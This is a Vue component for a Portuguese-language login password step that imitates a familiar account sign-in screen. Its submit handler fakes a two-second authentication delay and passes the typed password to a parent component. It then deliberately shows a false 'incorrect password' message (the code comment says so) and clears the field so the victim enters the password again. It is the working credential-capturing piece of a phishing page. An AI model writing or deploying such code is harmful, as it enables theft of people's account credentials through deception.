<template>
  <div class="step active">
    <h1>{{ userName }}</h1>
    <div class="user-info" @click="$emit('back-to-email')">
      <div class="user-avatar">{{ userInitial }}</div>
      <span id="user-email">{{ email }}</span>
      <button class="change-account">▼</button>
    </div>
    
    <form @submit.prevent="handleSubmit">
      <div class="input-group" :class="{ focused: isPasswordFocused, filled: password, error: showError }">
        <input 
          :type="showPassword ? 'text' : 'password'" 
          id="password" 
          v-model="password"
          @focus="isPasswordFocused = true"
          @blur="isPasswordFocused = false"
          placeholder=" "
          required
        >
        <label for="password">Digite sua senha</label>
      </div>

      <div v-if="showError" class="error-message">
        Senha incorreta. Tente novamente ou clique em "Esqueceu a senha?" para redefini-la.
      </div>
      
      <div class="show-password">
        <input type="checkbox" id="show-pass" v-model="showPassword">
        <label for="show-pass">Mostrar senha</label>
      </div>
      
      <div class="form-actions">
        <a href="#" class="forgot-password">Esqueceu a senha?</a>
        <button type="submit" class="next-btn" :disabled="!password || loading">
          <span v-if="loading" class="loading-spinner"></span>
          <span v-else>Avançar</span>
        </button>
      </div>
    </form>
  </div>
</template>

<script>
import { ref, computed } from 'vue'

export default {
  name: 'PasswordForm',
  props: {
    email: {
      type: String,
      required: true
    }
  },
  emits: ['password-submitted', 'back-to-email'],
  setup(props, { emit }) {
    const password = ref('')
    const isPasswordFocused = ref(false)
    const showPassword = ref(false)
    const loading = ref(false)
    const showError = ref(false)

    const userName = computed(() => {
      const localPart = props.email.split('@')[0]
      const name = localPart.replace(/[._]/g, ' ')
      return name.split(' ')
        .map(word => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase())
        .join(' ')
    })

    const userInitial = computed(() => {
      return userName.value.charAt(0).toUpperCase()
    })

    const handleSubmit = async () => {
      if (!password.value.trim()) return
      
      loading.value = true
      
      // Simular delay de autenticação
      await new Promise(resolve => setTimeout(resolve, 2000))
      
      emit('password-submitted', password.value.trim())
      
      // Mostrar erro falso
      showError.value = true
      password.value = ''
      loading.value = false
      
      // Remover erro após 5 segundos
      setTimeout(() => {
        showError.value = false
      }, 5000)
    }

    return {
      password,
      isPasswordFocused,
      showPassword,
      loading,
      showError,
      userName,
      userInitial,
      handleSubmit
    }
  }
}
</script>